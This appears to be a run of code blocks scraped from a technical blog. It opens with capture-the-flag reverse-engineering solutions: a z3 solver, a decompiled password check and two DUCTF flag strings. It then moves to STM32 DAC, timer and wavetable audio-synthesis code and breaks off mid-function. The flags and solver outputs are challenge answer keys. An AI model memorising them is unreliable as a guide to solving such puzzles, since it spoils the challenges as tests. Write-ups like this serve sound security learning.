        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>z3<span class="token punctuation">.</span>Implies<span class="token punctuation">(</span>sym <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> inputs<span class="token punctuation">[</span>index <span class="token operator">+</span> od<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Construct payload.</span>
payload <span class="token operator">=</span> <span class="token string">''</span>
m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> sym <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>sym<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># 0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000</code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">DUCTF{gr1d_puzzl3s_ar3_t00_ez_r1ght?}</code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// Set the SIGSEGV handler.</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sigsegv_sigaction<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
sigsegv_sigaction<span class="token punctuation">.</span>__sigaction_handler<span class="token punctuation">.</span>sa_handler <span class="token operator">=</span> oops<span class="token punctuation">;</span>
sigsegv_sigaction<span class="token punctuation">.</span>sa_flags <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
<span class="token function">sigaction</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sigsegv_sigaction<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Read input.</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Check input for correctness.</span>
local_c0 <span class="token operator">=</span> <span class="token operator">&amp;</span>DAT_13386000<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x40</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	j <span class="token operator">=</span> i<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>j <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> mangle_buf<span class="token punctuation">[</span>j <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span>
		   <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>i <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span>j <span class="token operator">&amp;</span> <span class="token number">0xfc</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">&amp;</span> <span class="token number">0x1f</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
		local_c0 <span class="token operator">=</span> local_c0 <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x15000</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
		local_c0 <span class="token operator">=</span> local_c0 <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x1000</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
		local_c0 <span class="token operator">=</span> local_c0 <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
		local_c0 <span class="token operator">=</span> local_c0 <span class="token operator">+</span> <span class="token number">0x15000</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>local_c0 <span class="token operator">==</span> <span class="token operator">&amp;</span>DAT_13398000<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Well done! Wrap that in DUCTF{}."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
	<span class="token function">oops</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-asm" tabindex="0"><code class="language-asm"><span class="token comment">; 0x4012fe. Load `local_c0` from stack to RAX.</span>
<span class="token instruction keyword">MOV</span>        <span class="token instruction keyword">RAX</span><span class="token punctuation">,</span>qword ptr <span class="token punctuation">[</span>RBP <span class="token operator">+</span> local_c0<span class="token punctuation">]</span>

<span class="token comment">; 0x401305. Dereference `RAX` to `AL`.</span>
<span class="token instruction keyword">MOV</span>        <span class="token instruction keyword">AL</span><span class="token punctuation">,</span>byte ptr <span class="token punctuation">[</span>RAX<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>DAT_13386000</code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">DUCTF{hElCYi8OxUF7PAA5}</code></pre>
<pre class="language-js" tabindex="0"><code class="language-js"><span class="token function">cmd</span><span class="token punctuation">(</span><span class="token string">"note-input"</span><span class="token punctuation">)</span>
<span class="token function">cmd</span><span class="token punctuation">(</span><span class="token string">"note-input"</span><span class="token punctuation">)</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MX_TIM8_Init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">// --snip-- Initialise structs. --snip--</span>

    htim8<span class="token punctuation">.</span>Instance               <span class="token operator">=</span> TIM8<span class="token punctuation">;</span>
    htim8<span class="token punctuation">.</span>Init<span class="token punctuation">.</span>Prescaler         <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    htim8<span class="token punctuation">.</span>Init<span class="token punctuation">.</span>CounterMode       <span class="token operator">=</span> TIM_COUNTERMODE_UP<span class="token punctuation">;</span>
    htim8<span class="token punctuation">.</span>Init<span class="token punctuation">.</span>Period            <span class="token operator">=</span> <span class="token number">4000</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    htim8<span class="token punctuation">.</span>Init<span class="token punctuation">.</span>ClockDivision     <span class="token operator">=</span> TIM_CLOCKDIVISION_DIV1<span class="token punctuation">;</span>
    htim8<span class="token punctuation">.</span>Init<span class="token punctuation">.</span>RepetitionCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    htim8<span class="token punctuation">.</span>Init<span class="token punctuation">.</span>AutoReloadPreload <span class="token operator">=</span> TIM_AUTORELOAD_PRELOAD_DISABLE<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">HAL_TIM_Base_Init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span> <span class="token operator">!=</span> HAL_OK<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">Error_Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// --snip-- Initialise the clock source. --snip--</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">HAL_TIM_PWM_Init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span> <span class="token operator">!=</span> HAL_OK<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">Error_Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// --snip-- Initialise other things. --snip--</span>
    
    <span class="token function">HAL_TIM_MspPostInit</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp">TIM8<span class="token operator">-&gt;</span>PSC <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// Prescaler: 1</span>
TIM8<span class="token operator">-&gt;</span>ARR <span class="token operator">=</span> <span class="token number">3999</span><span class="token punctuation">;</span> <span class="token comment">// Auto-Reload: 4000</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">HAL_TIM_Base_Start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Start the timer.</span>
<span class="token function">HAL_TIM_Base_Stop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Stop the timer.</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Start the DAC peripheral.</span>
<span class="token function">HAL_DAC_Start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">,</span> DAC_CHANNEL_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Set the DAC value to 1024 on Channel 1, 12-bit right-aligned.</span>
<span class="token function">HAL_DAC_SetValue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">,</span> DAC_CHANNEL_1<span class="token punctuation">,</span> DAC_ALIGN_12B_R<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">HAL_Delay</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> ms<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">uint32_t</span> start <span class="token operator">=</span> <span class="token function">HAL_GetTick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">HAL_GetTick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">HAL_DAC_Start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">,</span> DAC_CHANNEL_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Alternate between high (4095) and low (0).</span>
<span class="token keyword">uint8_t</span> high  <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">uint16_t</span> sample <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">?</span> <span class="token number">4095</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// max = 4095 = 2^12 - 1.</span>
    high <span class="token operator">=</span> <span class="token operator">!</span>high<span class="token punctuation">;</span>
    <span class="token function">HAL_DAC_SetValue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">,</span> DAC_CHANNEL_1<span class="token punctuation">,</span> DAC_ALIGN_12B_R<span class="token punctuation">,</span> sample<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Delay for 5ms.</span>
    <span class="token function">HAL_Delay</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">HAL_DAC_GetState</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">)</span> <span class="token operator">!=</span> HAL_DAC_STATE_READY<span class="token punctuation">)</span>
    <span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h&gt;</span>  <span class="token comment">// M_PI, sin</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SAMPLE_RATE</span> <span class="token expression"><span class="token number">42000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FREQUENCY</span>   <span class="token expression"><span class="token number">440</span></span></span>

<span class="token keyword">uint16_t</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">uint32_t</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Time (in samples).</span>

<span class="token comment">// Start the timer.</span>
<span class="token function">HAL_TIM_Base_Start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Prep the buffer.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> BUFFER_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> t<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">float</span> val <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> M_PI <span class="token operator">*</span> FREQUENCY <span class="token operator">*</span> t <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2047</span> <span class="token operator">*</span> val <span class="token operator">+</span> <span class="token number">2047</span><span class="token punctuation">;</span> <span class="token comment">// Scale the value from [-1, 1] to [0, 2^12-1).</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Wait for DAC to be ready, so that the buffer can be modified on the next iteration.</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">HAL_DAC_GetState</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">)</span> <span class="token operator">!=</span> HAL_DAC_STATE_READY<span class="token punctuation">)</span>
        <span class="token punctuation">;</span>

    <span class="token comment">// Start the DMA.</span>
    <span class="token function">HAL_DAC_Start_DMA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hdac<span class="token punctuation">,</span> DAC_CHANNEL_1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> DAC_ALIGN_12B_R<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">uint16_t</span> buffers<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// New: add a second buffer.</span>
<span class="token keyword">uint8_t</span> curr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                 <span class="token comment">// Index of current buffer.</span>
<span class="token keyword">uint32_t</span> t   <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token comment">// Start the timer.</span>
<span class="token function">HAL_TIM_Base_Start</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>htim8<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">uint16_t</span><span class="token operator">*</span> buffer <span class="token operator">=</span> buffers<span class="token punctuation">[</span>curr<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Get the buffer being written.</span>

    <span class="token comment">// --snip-- Same as before...</span>
    <span class="token comment">// Prep the buffer.</span>
    <span class="token comment">// Wait for DAC to be ready.</span>
    <span class="token comment">// Start the DMA.</span>
    <span class="token comment">// --snip--</span>

    <span class="token comment">// Point to the other buffer, so that we</span>
    <span class="token comment">// prepare it while the previous one</span>
    <span class="token comment">// is being sent.</span>
    curr <span class="token operator">=</span> <span class="token operator">!</span>curr<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Prep the buffer.</span>
<span class="token keyword">uint16_t</span><span class="token operator">*</span> buffer <span class="token operator">=</span> buffers<span class="token punctuation">[</span>curr<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> BUFFER_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> t<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Compute value for each note.</span>
    <span class="token keyword">float</span> a <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> M_PI <span class="token operator">*</span> <span class="token number">440</span> <span class="token operator">*</span> t <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> cs <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> M_PI <span class="token operator">*</span> <span class="token number">554.37</span> <span class="token operator">*</span> t <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> e <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> M_PI <span class="token operator">*</span> <span class="token number">659.25</span> <span class="token operator">*</span> t <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">float</span> val <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> cs <span class="token operator">+</span> e<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">// Sum and normalise to [-1, 1].</span>
    buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2047</span> <span class="token operator">*</span> val <span class="token operator">+</span> <span class="token number">2047</span><span class="token punctuation">;</span> <span class="token comment">// Map [-1, 1] to [0, 2^12-1).</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Precompute a factor of the 440Hz signal.</span>
<span class="token keyword">float</span> two_pi_f_over_sr <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> M_PI <span class="token operator">*</span> FREQUENCY <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Prep the buffer.</span>
    <span class="token keyword">uint16_t</span><span class="token operator">*</span> buffer <span class="token operator">=</span> buffers<span class="token punctuation">[</span>curr<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> BUFFER_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> t<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Use the precomputed value...</span>
        buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2047</span> <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>two_pi_f_over_sr <span class="token operator">*</span> t<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2047</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// ...</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp">TIM8<span class="token operator">-&gt;</span>ARR <span class="token operator">=</span> <span class="token number">7999</span><span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SAMPLE_RATE</span> <span class="token expression"><span class="token number">44100</span>  </span><span class="token comment">// Number of samples per second.</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">1024</span>   </span><span class="token comment">// Length of the buffer.</span></span>

<span class="token comment">// Define an array for storing samples.</span>
<span class="token keyword">float</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Buffer of samples to populate, each ranging from -1 to 1.</span>

<span class="token comment">/**
 * Generate samples of a sine wave and store them in a buffer.
 * @param freq  Frequency of the sine wave, in Hz.
 */</span>
<span class="token keyword">void</span> <span class="token function">generate_samples</span><span class="token punctuation">(</span><span class="token keyword">float</span> freq<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Populate the buffer with a sine tone with frequency `freq`.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> BUFFER_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> PI <span class="token operator">*</span> freq <span class="token operator">*</span> i <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SAMPLE_RATE</span> <span class="token expression"><span class="token number">44100</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span>

<span class="token keyword">float</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Generate samples of two sine waves played together and store them in a buffer.
 * @param freq  Frequency of the first sine wave, in Hz.
 * @param freq2 Frequency of the second sine wave, in Hz.
 */</span>
<span class="token keyword">void</span> <span class="token function">generate_samples2</span><span class="token punctuation">(</span><span class="token keyword">float</span> freq<span class="token punctuation">,</span> <span class="token keyword">float</span> freq2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> BUFFER_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0.5f</span> <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> PI <span class="token operator">*</span> freq <span class="token operator">*</span> i <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">0.5f</span> <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> PI <span class="token operator">*</span> freq2 <span class="token operator">*</span> i <span class="token operator">/</span> SAMPLE_RATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SINE_WAVETABLE_SIZE</span> <span class="token expression"><span class="token number">256</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SAMPLE_RATE</span> <span class="token expression"><span class="token number">44100</span>  </span><span class="token comment">// Number of samples per second (of the target waveform).</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span>

<span class="token comment">// The pre-generated wavetable. It should capture one cycle of the desired waveform (in this case, a sine).</span>
<span class="token keyword">float</span> sine_wavetable<span class="token punctuation">[</span>SINE_WAVETABLE_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/* pre-generated values ... */</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// The phase indicates how far along the wavetable we are.</span>
<span class="token comment">// We're concerned with two components: the integer and decimal.</span>
<span class="token comment">// The integer part indicates the index of left sample along the wavetable, modulus the size.</span>
<span class="token comment">// The decimal part indicates the fraction between the left and right samples.</span>
<span class="token keyword">float</span> phase <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">float</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Generate samples of a sine wave by interpolating a wavetable.
 * @param freq  Frequency of the sine wave, in Hz.
 */</span>
<span class="token keyword">float</span> <span class="token function">get_next_sample</span><span class="token punctuation">(</span><span class="token keyword">float</span> freq<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    size_t idx <span class="token operator">=</span> <span class="token function">size_t</span><span class="token punctuation">(</span>phase<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Integer part.</span>
    <span class="token keyword">float</span> frac <span class="token operator">=</span> phase <span class="token operator">-</span> idx<span class="token punctuation">;</span>   <span class="token comment">// Decimal part.</span>

    <span class="token comment">// Get the pre-generated sample to the LEFT of the current sample.</span>
    <span class="token keyword">float</span> samp0 <span class="token operator">=</span> sine_wavetable<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Get the pre-generated sample to the RIGHT of the current sample.</span>
